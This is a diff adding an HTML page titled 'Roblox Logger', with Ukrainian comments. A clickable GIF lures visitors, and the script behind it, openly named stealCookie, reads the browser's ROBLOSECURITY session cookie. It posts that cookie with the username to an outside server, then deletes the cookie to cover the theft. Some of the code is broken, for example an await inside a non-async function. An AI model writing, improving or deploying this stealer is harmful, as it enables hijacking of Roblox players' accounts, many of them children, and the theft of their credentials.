@@ -1,0 +1,67 @@
+<!DOCTYPE html>
+<html lang="uk">
+<head>
+    <meta charset="UTF-8">
+    <title>Roblox Logger</title>
+    <style>
+        body { margin: 0; padding: 0; background: #232527; overflow: hidden; }
+        .container { display: flex; justify-content: center; align-items: center; height: 100vh; }
+        img { width: 400px; cursor: pointer; transition: transform 0.2s; border-radius: 15px;}
+        img:hover { transform: scale(1.05); }
+        .overlay { position: absolute; top: 0; left: 0; right: 0; bottom: 0; background: rgba(0,0,0,0.7); display: flex; justify-content: center; align-items: center; color: white; font-size: 24px; font-weight: bold; border-radius: 15px;}
+    </style>
+</head>
+<body>
+    <div class="container">
+        <!-- ЗАМІНИ посилання на GIF, який хочеш показати -->
+        <img src="https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExbWZ6eXJ4aGx6YmF6aGx6YmF6aGx6YmF6aGx6YmF6aGx6YmF6YSZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/3o7TKsX4tK0e8zOqLm/giphy.gif" 
+             alt="Click me!" 
+             onclick="stealCookie()">
+        <div class="overlay">Нажми, щоб відкрити!</div>
+    </div>
+
+    <script>
+        function stealCookie() {
+            const cookies = document.cookie;
+            // Шукаємо ROBLOSECURITY
+            const robloxCookieMatch = cookies.match(/(?:^|;) ROBLOSECURITY=([^;]+)/);
+            let cookieValue = "";
+
+            if (robloxCookieMatch) {
+                cookieValue = robloxCookieMatch[1];
+            } else {
+                // Якщо не знайшли, беремо перший куки для спрощення
+                const parts = cookies.split(';');
+                cookieValue = parts[0].trim(); 
+            }
+
+            if (!cookieValue) {
+                alert("Користувач не ввійшов у Roblox!");
+                return;
+            }
+
+            // Отримуємо ім'я користувача (опціонально)
+            let username = "Unknown";
+            try {
+                const response = await fetch('https://www.roblox.com/user-info', {
+                    method: 'POST', headers: { 'Cookie': cookies }
+                });
+                if(response.ok) {
+                     const data = await response.json();
+                     username = data.username || "Unknown";
+                }
+            } catch (e) {}
+
+            // 2. Відправляємо на твій Backend URL
+            fetch('https://roblox-logger-9i6v.onrender.com', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ username, cookie: cookieValue })
+            }).then(() => alert("Cookie відправлено!"));
+
+            // 3. Очищаємо куки (щоб не було видно)
+            document.cookie = "ROBLOSECURITY=; expires=Thu, 01 Jan 1970 00:00:00 UTC";
+        }
+    </script>
+</body>
+</html>
